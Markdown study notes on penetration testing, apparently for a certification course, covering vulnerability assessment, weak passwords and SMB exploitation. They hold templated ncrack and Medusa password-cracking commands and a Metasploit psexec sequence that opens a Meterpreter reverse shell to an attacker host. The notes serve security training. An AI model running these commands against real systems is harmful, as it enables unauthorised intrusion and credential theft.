# Vulnerability Assessment and Exploitation
## Vulnerability Assessment
* The VA (Vulnerability Assessment) phase is aimed at building a list of vulnerabilities present on the target system.
* This is so that, attacker can have a list of vulnerabilities to try their exploit on and the bigger the list of vulnerabilities, the higher the chances of successful exploit.
* Vulnerabilties can be assessed from Enumeration phase, and there are also automated tools to do VA.
* Automated VA tools are usually scanners that send probes to the target system looking for well known vulnerabilities and subsequently delivers a report that the pentester can use during exploitation phase.
* Properly configuring the VA tools will help save time and also prevent the service from crashing when doing VA. However VA tools are noisy.

### Automated VA Tools
* Nessus

### Low Hanging Fruits
* Low Hanging Fruits (LHF) refers to Misconfigured or vulnerable Server, Unimplemented or Badly Implemented ACL, default or weak password, Open SMB shares / Null sessions, Broadcast Requests, etc.
* Some of the techniques to tackle LHF has already been discussed.

### Weak or Default Passwords
* Weak or default Passwords are still statistically speaking the weakest link.
* They can be exploited on common services like RDP, SMB, FTP, SQL etc.

#### Tools 
1. ncrack
   * network auth cracking tool that supports cracking of FTP, SSH, TELNET, HTTP(S), POP3, SMB, RDP and VNC.
   * By default ncrack does a password spray i.e iterates usernames for a fixed password
   * Default ncrack comes with its own password and username list.
   * **General Syntax : ** `ncrack <service>://<ip address/range>:<port number(optional)> -U <path to username file list> -P <path to password file list>`
   * **crack web address : ** `ncrack add <service>://<web address>:<port number(optional)>`
   * **Multiple addresses : ** `ncrack <service>://<ip address/range>:<port number(optional) <service2>://<ip address2/range2>:<port number2(optional)>` or `ncrack <ip addresses> -p <service>:<port>,<service2>:<port2>`
2. Medusa
   * Similar to ncrack but offers more services and options.
   * **General Synatx : ** `medusa -h <ip address> -M <service> -U <username list> -P <password list>`
   * **List all Modules(services) : ** `medusa -d`  
   * **To know more about a specific module : ** `medusa -M <service> -q`
3. Patator

## SMB Exploit
* Metasploit
   * Well establishing a shell is always easier using metasploit ~ ~ ~
   ```
   use exploit/windows/smb/psexec
   set RHOST <ip address>
   set SMBPass <password>
   set SMBUser <username>
   set PAYLOAD windows/meterpreter/reverse_tcp
   set LHOST 172.16.10.5
   exploit
   ```
* NMAP
   * Making use of the `SMB_PSEXEC` and `script-args` module in nmap
* SMBCLIENT
